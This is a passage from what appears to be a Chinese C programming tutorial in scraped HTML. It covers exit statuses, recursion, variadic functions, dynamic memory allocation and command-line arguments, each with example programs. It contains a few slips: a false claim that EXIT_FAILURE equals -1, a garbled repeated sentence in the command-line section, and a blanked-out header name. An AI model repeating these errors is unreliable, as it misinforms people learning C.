class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> dividend = <span class="number">20</span>;</span><br><span class="line">   <span class="keyword">int</span> divisor = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">int</span> quotient;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span>( divisor == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"除数为 0 退出运行...\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   quotient = dividend / divisor;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"quotient 变量的值为 : %d\n"</span>, quotient );</span><br><span class="line"></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除数为 <span class="number">0</span> 退出运行...</span><br></pre></td></tr></table></figure><h3 id="程序退出状态"><a href="#程序退出状态" class="headerlink" title="程序退出状态"></a>程序退出状态</h3><p>通常情况下，程序成功执行完一个操作正常退出的时候会带有值 EXIT_SUCCESS。在这里，EXIT_SUCCESS 是宏，它被定义为 0。</p><p>如果程序中存在一种错误情况，当您退出程序时，会带有状态值 EXIT_FAILURE，被定义为 -1。所以，上面的程序可以写成：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> dividend = <span class="number">20</span>;</span><br><span class="line">   <span class="keyword">int</span> divisor = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">int</span> quotient;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span>( divisor == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"除数为 0 退出运行...\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">   &#125;</span><br><span class="line">   quotient = dividend / divisor;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"quotient 变量的值为: %d\n"</span>, quotient );</span><br><span class="line"></span><br><span class="line">   <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotient 变量的值为 : <span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="C-递归"><a href="#C-递归" class="headerlink" title="C    递归"></a>C    递归</h2><p>递归指的是在函数的定义中使用函数自身的方法。</p><blockquote><p>举个例子：<br>从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？”从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？’从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？……’”</p></blockquote><p>语法格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recursion</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   statements;</span><br><span class="line">   ... ... ...</span><br><span class="line">   recursion(); <span class="comment">/* 函数调用自身 */</span></span><br><span class="line">   ... ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   recursion();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程图：</p><p><img alt="img" data-src="https://www.runoob.com/wp-content/uploads/2014/09/recursion_0.png" class="lazyload"></p><p>C 语言支持递归，即一个函数可以调用其自身。但在使用递归时，程序员需要注意定义一个从函数退出的条件，否则会进入死循环。</p><p>递归函数在解决许多数学问题上起了至关重要的作用，比如计算一个数的阶乘、生成斐波那契数列，等等。</p><h3 id="数的阶乘"><a href="#数的阶乘" class="headerlink" title="数的阶乘"></a>数的阶乘</h3><p> 下面的实例使用递归函数计算一个给定的数的阶乘： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">factorial</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(i &lt;= <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> i * factorial(i - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">15</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d 的阶乘为 %f\n"</span>, i, factorial(i));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span> 的阶乘为 <span class="number">1307674368000.000000</span></span><br></pre></td></tr></table></figure><h3 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h3><p> 下面的实例使用递归函数生成一个给定的数的斐波那契数列： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibonaci</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(i == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> fibonaci(i<span class="number">-1</span>) + fibonaci(i<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%d\t\n"</span>, fibonaci(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>    </span><br><span class="line"><span class="number">1</span>    </span><br><span class="line"><span class="number">1</span>    </span><br><span class="line"><span class="number">2</span>    </span><br><span class="line"><span class="number">3</span>    </span><br><span class="line"><span class="number">5</span>    </span><br><span class="line"><span class="number">8</span>    </span><br><span class="line"><span class="number">13</span>    </span><br><span class="line"><span class="number">21</span>    </span><br><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure><h2 id="C-可变参数"><a href="#C-可变参数" class="headerlink" title="C 可变参数"></a>C 可变参数</h2><p>有时，您可能会碰到这样的情况，您希望函数带有可变数量的参数，而不是预定义数量的参数。C 语言为这种情况提供了一个解决方案，它允许您定义一个函数，能根据具体的需求接受可变数量的参数。下面的实例演示了这种函数的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>, ... )</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   .</span><br><span class="line">   .</span><br><span class="line">   .</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   func(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">   func(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，函数 <strong>func()</strong> 最后一个参数写成省略号，即三个点号（<strong>…</strong>），省略号之前的那个参数是 <strong>int</strong>，代表了要传递的可变参数的总数。为了使用这个功能，您需要使用 <strong>stdarg.h</strong> 头文件，该文件提供了实现可变参数功能的函数和宏。具体步骤如下：</p><ul><li>定义一个函数，最后一个参数为省略号，省略号前面可以设置自定义参数。</li><li>在函数定义中创建一个 <strong>va_list</strong> 类型变量，该类型是在 stdarg.h 头文件中定义的。</li><li>使用 <strong>int</strong> 参数和 <strong>va_start</strong> 宏来初始化 <strong>va_list</strong> 变量为一个参数列表。宏 va_start 是在 stdarg.h 头文件中定义的。</li><li>使用 <strong>va_arg</strong> 宏和 <strong>va_list</strong> 变量来访问参数列表中的每个项。</li><li>使用宏 <strong>va_end</strong> 来清理赋予 <strong>va_list</strong> 变量的内存。</li></ul><p>现在让我们按照上面的步骤，来编写一个带有可变数量参数的函数，并返回它们的平均值：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">average</span><span class="params">(<span class="keyword">int</span> num,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    va_list valist;</span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 为 num 个参数初始化 valist */</span></span><br><span class="line">    va_start(valist, num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 访问所有赋给 valist 的参数 */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">       sum += va_arg(valist, <span class="keyword">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 清理为 valist 保留的内存 */</span></span><br><span class="line">    va_end(valist);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum/num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Average of 2, 3, 4, 5 = %f\n"</span>, average(<span class="number">4</span>, <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>));</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Average of 5, 10, 15 = %f\n"</span>, average(<span class="number">3</span>, <span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果。应该指出的是，函数 <strong>average()</strong> 被调用两次，每次第一个参数都是表示被传的可变参数的总数。省略号被用来传递可变数量的参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average of <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> = <span class="number">3.500000</span></span><br><span class="line">Average of <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span> = <span class="number">10.000000</span></span><br></pre></td></tr></table></figure><h2 id="C-内存管理"><a href="#C-内存管理" class="headerlink" title="C 内存管理"></a>C 内存管理</h2><p>本章将讲解 C 中的动态内存管理。C 语言为内存的分配和管理提供了几个函数。这些函数可以在 **** 头文件中找到。</p><table><thead><tr><th align="left">序号</th><th align="left">函数和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>void *calloc(int num, int size);</strong> 在内存中动态地分配 num 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num*size 个字节长度的内存空间，并且每个字节的值都是0。</td></tr><tr><td align="left">2</td><td align="left"><strong>void free(void *address);</strong>  该函数释放 address 所指向的内存块,释放的是动态分配的内存空间。</td></tr><tr><td align="left">3</td><td align="left"><strong>void *malloc(int num);</strong>  在堆区分配一块指定大小的内存空间，用来存放数据。这块内存空间在函数执行完成后不会被初始化，它们的值是未知的。</td></tr><tr><td align="left">4</td><td align="left"><strong>void *realloc(void *address, int newsize);</strong>  该函数重新分配内存，把内存扩展到 <strong>newsize</strong>。</td></tr></tbody></table><p><strong>注意：</strong>void * 类型表示未确定类型的指针。C、C++ 规定 void * 类型可以通过类型转换强制转换为任何其它类型的指针。</p><h3 id="动态分配内存"><a href="#动态分配内存" class="headerlink" title="动态分配内存"></a>动态分配内存</h3><p>编程时，如果您预先知道数组的大小，那么定义数组时就比较容易。例如，一个存储人名的数组，它最多容纳 100 个字符，所以您可以定义数组，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br></pre></td></tr></table></figure><p>但是，如果您预先不知道需要存储的文本长度，例如您向存储有关一个主题的详细描述。在这里，我们需要定义一个指针，该指针指向未定义所需内存大小的字符，后续再根据需求来分配内存，如下所示：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">char</span> *description;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strcpy</span>(name, <span class="string">"Zara Ali"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 动态分配内存 */</span></span><br><span class="line">   description = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>( <span class="number">200</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>) );</span><br><span class="line">   <span class="keyword">if</span>( description == <span class="literal">NULL</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error - unable to allocate required memory\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>( description, <span class="string">"Zara ali a DPS student in class 10th"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Name = %s\n"</span>, name );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, description );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name = Zara Ali</span><br><span class="line">Description: Zara ali a DPS student in class <span class="number">10</span>th</span><br></pre></td></tr></table></figure><p>上面的程序也可以使用 <strong>calloc()</strong> 来编写，只需要把 malloc 替换为 calloc 即可，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">200</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br></pre></td></tr></table></figure><p>当动态分配内存时，您有完全控制权，可以传递任何大小的值。而那些预先定义了大小的数组，一旦定义则无法改变大小。</p><h3 id="重新调整内存的大小和释放内存"><a href="#重新调整内存的大小和释放内存" class="headerlink" title="重新调整内存的大小和释放内存"></a>重新调整内存的大小和释放内存</h3><p>当程序退出时，操作系统会自动释放所有分配给程序的内存，但是，建议您在不需要内存时，都应该调用函数 <strong>free()</strong> 来释放内存。</p><p>或者，您可以通过调用函数 <strong>realloc()</strong> 来增加或减少已分配的内存块的大小。让我们使用 realloc() 和 free() 函数，再次查看上面的实例：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">char</span> *description;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">strcpy</span>(name, <span class="string">"Zara Ali"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 动态分配内存 */</span></span><br><span class="line">   description = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>( <span class="number">30</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>) );</span><br><span class="line">   <span class="keyword">if</span>( description == <span class="literal">NULL</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error - unable to allocate required memory\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>( description, <span class="string">"Zara ali a DPS student."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 假设您想要存储更大的描述信息 */</span></span><br><span class="line">   description = (<span class="keyword">char</span> *) <span class="built_in">realloc</span>( description, <span class="number">100</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>) );</span><br><span class="line">   <span class="keyword">if</span>( description == <span class="literal">NULL</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error - unable to allocate required memory\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">strcat</span>( description, <span class="string">"She is in class 10th"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Name = %s\n"</span>, name );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, description );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 使用 free() 函数释放内存 */</span></span><br><span class="line">   <span class="built_in">free</span>(description);</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name = Zara Ali</span><br><span class="line">Description: Zara ali a DPS student.She is in class <span class="number">10</span>th</span><br></pre></td></tr></table></figure><p>您可以尝试一下不重新分配额外的内存，strcat() 函数会生成一个错误，因为存储 description 时可用的内存不足。</p><h2 id="C-命令行参数"><a href="#C-命令行参数" class="headerlink" title="C 命令行参数"></a>C 命令行参数</h2><p>执行程序时，可以从命令行传值给 C 程序。这些值被称为<strong>命令行参数</strong>，它们对程序很重要，特别是当您想从外部控制程序，而不是在代码内对这些值进行硬编码时，就显得尤为重要了。</p><p>命令行参数是使用 main() 函数参数来处理的，其中，<strong>argc</strong> 是指传入参数的个数，<strong>argv[]</strong> 是一个指针数组，指向传递给程序的每个参数。下面是一个简单的实例，检查命令行是否有提供参数，并根据参数执行相应的动作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>( argc == <span class="number">2</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The argument supplied is %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>( argc &gt; <span class="number">2</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Too many arguments supplied.\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"One argument expected.\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用一个参数，编译并执行上面的代码，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$./a.out testing</span><br><span class="line">The argument supplied is testing</span><br></pre></td></tr></table></figure><p>使用两个参数，编译并执行上面的代码，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$./a.out testing1 testing2</span><br><span class="line">Too many arguments supplied.</span><br></pre></td></tr></table></figure><p>不传任何参数，编译并执行上面的代码，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$./a.out</span><br><span class="line">One argument expected</span><br></pre></td></tr></table></figure><p>应当指出的是，<strong>argv[0]</strong> 存储程序的名称，<strong>argv[1]</strong> 是一个指向第一个命令行参数的指针，<em>argv[n] 是最后一个参数。如果没有提供任何参数，argc 将为 1，否则，如果传递了一个参数，*</em>argc** 将被设置为 2。</p><p>多个命令行参数之间用空格分隔，但是如果参数本身带有空格，那么传递参数的时候应把参数放置在双引号 “” 或单引号 ‘’ 内部。让我们重新编写上面的实例，有一个空间，那么你可以通过这样的观点，把它们放在双引号或单引号””””。让我们重新编写上面的实例，向程序传递一个放置在双引号内部的命令行参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span 